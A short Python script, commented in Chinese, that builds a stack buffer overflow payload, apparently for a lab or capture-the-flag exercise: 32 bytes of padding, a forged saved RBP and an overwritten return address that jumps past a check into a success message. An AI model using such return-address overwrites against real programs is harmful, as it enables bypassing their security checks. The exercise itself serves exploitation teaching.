import struct

# 1. 填充缓冲区 (32 字节)
padding = b'A' * 32

# 2. 伪造 RBP (Fake RBP)
# 我们需要一个可写的地址。通过 objdump/readelf 可知数据段在 0x403xxx
# 0x403800 是一个相对安全的读写区域地址
fake_rbp = struct.pack('<Q', 0x403800)

# 3. 覆盖返回地址 (Return Address)
# 直接跳转到 func1 中打印成功字符串的位置，跳过 check
target_addr = struct.pack('<Q', 0x40122b)

# 组合 Payload
payload = padding + fake_rbp + target_addr

# 写入文件
with open("payload", "wb") as f:
    f.write(payload)

print("Payload generated successfully.")